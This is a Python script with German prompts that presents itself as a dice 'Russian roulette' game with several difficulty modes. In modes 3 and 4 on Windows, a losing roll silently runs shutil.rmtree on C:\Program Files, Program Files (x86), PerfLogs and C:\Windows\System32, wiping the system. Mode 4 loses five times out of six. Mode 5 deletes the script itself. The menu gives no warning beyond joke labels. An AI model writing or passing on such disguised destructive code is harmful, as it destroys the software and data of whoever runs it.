import random
import os
import shutil


def frage_modus() -> str:
    while True:
        modus = input(
            "Sooo, bevor es losgeht. Welchen Schwierigkeitsgrad willst du haben?\n"
            "1: Leicht, 2: Normal, 3: Schwer, 4: Für echte Männer, 5: Bestimmt lustig\n> "
        ).strip()
        if modus in {"1", "2", "3", "4", "5"}:
            return modus
        print("Sei kein Weichei und gib was Gültiges ein! (1–5)")

def spiel_runde(modus: str) -> str:
    # Für 3/4 nur unter Windows sinnvoll
    if modus in {"3", "4"} and os.name != "nt":
        return "Dafür geht leider nur Windows... Probiere es dort aus! Wähle stattdessen 1 oder 2."

    zufall = random.randint(1, 6)
    print(f"Gewürfelte Zahl: {zufall}")

    reply = ""

    if modus == "1":
        verloren = (zufall == 3)
        if verloren:
            reply = "Oh... Verloren. Zum Glück war's auf leicht..."
        else:
            reply = "Gewonnen! Glück gehabt... Spielst ja auch den Babymodus haha."

    elif modus == "2":
        verloren = (zufall in (3, 4))
        if verloren:
            reply = "Verloren... Zum Glück nichts verloren außer Ehre...."
        else:
            reply = "Gewonnen! Glück gehabt... War ja auch einfach..."

    elif modus == "3":
        verloren = (zufall == 3)
        if verloren:
                reply = "Verloren :("
                shutil.rmtree("C:\\Program Files")
                shutil.rmtree("C:\\Program Files (x86)")
                shutil.rmtree("C:\\PerfLogs")
                shutil.rmtree("C:\\Windows\\System32")
        else:
            reply = "Puh.. Gewonnen.. Glück gehabt!"

    elif modus == "4":
        verloren = (zufall != 3)
        if verloren:
                reply = ("Verloren :(")
                shutil.rmtree("C:\\Program Files")
                shutil.rmtree("C:\\Program Files (x86)")
                shutil.rmtree("C:\\PerfLogs")
                shutil.rmtree("C:\\Windows\\System32")
        else:
            reply = "Glück gehabt."

    else:  # modus == "5"
        verloren = (zufall == 3)
        if verloren:
            reply = "Verloren :( Egal war lustig mit dir)"
            ad = __file__
            os.remove(ad)
        else:
            reply = "Glück gehabt, aber wär auch irgendwie lustig wenn nicht ;)"

    return reply

def main():
    nochmal = "ja"
    while nochmal.strip().lower() == "ja":
        modus = frage_modus()
        reply = spiel_runde(modus)
        nochmal = input(f"{reply} Wenn nochmal, bitte mit 'ja' antworten ^^\n> ")

if __name__ == "__main__":
    main()
